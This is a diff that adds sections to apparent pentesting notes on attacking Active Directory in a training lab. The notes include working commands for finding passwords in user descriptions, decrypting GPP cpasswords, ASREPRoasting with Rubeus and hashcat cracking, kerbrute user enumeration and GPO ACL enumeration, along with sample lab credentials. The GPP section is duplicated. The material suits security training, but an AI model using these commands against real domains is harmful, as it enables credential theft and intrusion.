@@ -516,6 +516,125 @@ Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildnam
 
 Some detection methods: [https://www.praetorian.com/blog/a-simple-and-effective-way-to-detect-broadcast-name-resolution-poisoning-bnrp/](https://www.praetorian.com/blog/a-simple-and-effective-way-to-detect-broadcast-name-resolution-poisoning-bnrp/) 
 
+
+### Finding Passwords in the Description Field using Get-Domain User
+
+```powershell
+# Import PowerView.ps1
+Import-Module .\PowerView.ps1
+# Find passwords in descriptions
+Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
+```
+
+### PASSWD_NOTREQD Field
+
+It is possible to come across domain accounts with the passwd_notreqd field set in the userAccountControl attribute. If this is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all (if empty passwords are allowed in the domain). 
+
+
+```powershell
+# Import PowerView.ps1
+Import-Module .\PowerView.ps1
+# Find passwords in descriptions
+Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
+```
+
+### Credentials in SMB Shares and SYSVOL Scripts
+
+The SYSVOL share can be a treasure trove of data, especially in large organizations. It is recommendable always have to look at it.
+
+#### Group Policy Preferences (GPP) Passwords 
+
+When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:
+
+- Map drives (drives.xml)
+- Create local users
+- Create printer config files (printers.xml)
+- Creating and updating services (services.xml)
+- Creating scheduled tasks (scheduledtasks.xml)
+- Changing local admin passwords.
+
+These files can contain an array of configuration data and defined passwords. The `cpassword` attribute value is AES-256 bit encrypted, but Microsoft [published the AES private key on MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN), which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.
+
+This was patched in 2014 [MS14-025 Vulnerability in GPP could allow elevation of privilege](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30), to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.
+
+In older Windows environments like Server 2003 and 2008, the XML file stores encrypted AES passwords in the “cpassword” parameter that can get decrypted with Microsoft’s public AES key (link). If you retrieve the cpassword value more manually, the `gpp-decrypt` utility can be used to decrypt the password as follows:
+
+```bash
+gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
+```
+
+Locating & Retrieving GPP Passwords with CrackMapExec
+
+```shell-session
+crackmapexec smb -L | grep gpp
+```
+
+To access the GPP information and decrypt its stored password using CrackMapExec, we can use 2 modules — `**gpp_password**` and `**gpp_autologin**` modules. The `**gpp_password**` decrypts passwords stored in the Group.xml file, while `**gpp_autologin**` retrieves autologin information from the Registry.xml file in the preferences folder.
+
+
+```bash
+crackmapexec smb $domainControllerIP -u $user -p $password -M gpp_autologin
+# Example:
+# crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
+```
+
+Results:
+```
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']
+```
+
+### 💡 ASREPRoasting
+
+It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled. 
+
+ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. This setting can be enumerated with PowerView or built-in tools such as the PowerShell AD module.
+
+#### DONT_REQ_PREAUTH Value using Get-DomainUser
+
+Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
+
+```powershell
+Import-Module .\PowerView.ps1
+Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+```
+
+With this information in hand, the Rubeus tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking. This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth.
+
+```powershell
+# Retrieving AS-REP in Proper Format using Rubeus
+.\Rubeus.exe asreproast /user:$user /nowrap /format:hashcat
+# Example:
+# .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
+```
+
+Cracking the Hash Offline with Hashcat:
+
+```bash
+hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
+```
+
+#### DONT_REQ_PREAUTH Value using kerbrute
+
+```shell-session
+# From linux
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
+
+# From Windows
+ .\kerbrute_Windows.exe userenum -d inlanefreight.local --dc 172.16.5.5 .\users.txt
+```
+
+However, this will be as accurate as the user list.
+
+
+####  Get-NPUsers.py from the Impacket toolkit
+
+```bash
+# Retuns all users that with DONT_REQ_PREAUTH amd UF_DONT_REQ_PREAUTH
+GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile jsmith.txt | grep -v SessionError
+```
+
 ## 3. Password policy 
 
 Some tools work for this end: `net.exe`, PowerView, CrackMapExec ported to Windows, SharpMapExec, SharpView, etc.
@@ -557,6 +676,49 @@ net accounts /domain
 
 # Information about the current user
 net user %username%	
+```
+
+### Group Policy Preferences (GPP) Passwords
+
+When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:
+
+- Map drives (drives.xml)
+- Create local users
+- Create printer config files (printers.xml)
+- Creating and updating services (services.xml)
+- Creating scheduled tasks (scheduledtasks.xml)
+- Changing local admin passwords.
+
+These files can contain an array of configuration data and defined passwords. The `cpassword` attribute value is AES-256 bit encrypted, but Microsoft [published the AES private key on MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN), which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.
+
+This was patched in 2014 [MS14-025 Vulnerability in GPP could allow elevation of privilege](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30), to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.
+
+In older Windows environments like Server 2003 and 2008, the XML file stores encrypted AES passwords in the “cpassword” parameter that can get decrypted with Microsoft’s public AES key (link). If you retrieve the cpassword value more manually, the `gpp-decrypt` utility can be used to decrypt the password as follows:
+
+```bash
+gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
+```
+
+Locating & Retrieving GPP Passwords with CrackMapExec
+
+```shell-session
+crackmapexec smb -L | grep gpp
+```
+
+To access the GPP information and decrypt its stored password using CrackMapExec, we can use 2 modules — `**gpp_password**` and `**gpp_autologin**` modules. The `**gpp_password**` decrypts passwords stored in the Group.xml file, while `**gpp_autologin**` retrieves autologin information from the Registry.xml file in the preferences folder.
+
+
+```bash
+crackmapexec smb $domainControllerIP -u $user -p $password -M gpp_autologin
+# Example:
+# crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
+```
+
+Results:
+```
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']
 ```
 
 
@@ -866,4 +1028,86 @@ Snaffler.exe -s -d $domain -o snaffler.log -v data
 # -o: writes results to a logfile
 # -v: verbosity level. "data" is best as it only displays results to the screen
 ```
+
+## 7. DNS Records
+
+! tips ""
+	- [Getting in the Zone: dumping Active Directory DNS using adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
+	- [See the tool adidnsdump](adidnsdump.md)
+
+
+### adidnsdump
+
+[See  adidnsdump](adidnsdump.md).
+
+We can use a tool such as adidnsdump to enumerate all DNS records in a domain using a valid domain user account.  The tool works because, by default, all users can list the child objects of a DNS zone in an AD environment. By default, querying DNS records using LDAP does not return all results. So by using the `adidnsdump` tool, we can resolve all records in the zone and potentially find something useful for our engagement.
+
+```bash
+adidnsdump -u $domain\\$user ldap://$DomainControllerIP
+# Example:
+# adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 
+
+# Viewing the Contents of the records.csv File
+head records.csv 
+
+# If we run again with the -r flag the tool will attempt to resolve unknown records by performing an A query. 
+adidnsdump -u $domain\\$user ldap://$DomainControllerIP -r
+# Example:
+# adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
+
+# Now records.csv will include previously hidden records
+head records.csv 
+```
+
+
+
+## 8. Group Policy Object (GPO)
+
+We can enumerate GPO information using many of the tools we've been using throughout this module such as PowerView and BloodHound. We can also use [group3r](https://github.com/Group3r/Group3r), [ADRecon](https://github.com/sense-of-security/ADRecon), [PingCastle](https://www.pingcastle.com/), among others, to audit the security of GPOs in a domain.
+
+### Powershell
+
+If Group Policy Management Tools are installed on the host we are working from, we can use various built-in [GroupPolicy cmdlets](https://docs.microsoft.com/en-us/powershell/module/grouppolicy/?view=windowsserver2022-ps) such as `Get-GPO` to perform the same enumeration.
+
+```powershell
+Get-GPO -All | Select DisplayName
+```
+
+
+### Powerview
+Using the [Get-DomainGPO](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGPO) function from PowerView, we can get a listing of GPOs by name.
+
+```powershell
+Import-Module .\PowerView.ps1
+Get-DomainGPO |select displayname
+```
+
+Enumerating GPO Names with PowerView
+
+```powershell
+$sid=Convert-NameToSid "Domain Users"
+Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
+```
+
+Results:
+
+``` 
+ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
+ObjectSID             :
+ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl, WriteOwner
+
+... SNIP ...
+
+```
+
+Converting GPO GUID to Name:
+
+```powershell
+Get-GPO -Guid $GUID
+# Example:
+# Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
+# In this case we  can see that the `Domain Users` group has several rights over the `Disconnect Idle RDP` GPO. 
+```
+
+[See how to take this attack further](active-directory-from-windows-attacks.md#group-policy-object-abuse).
 
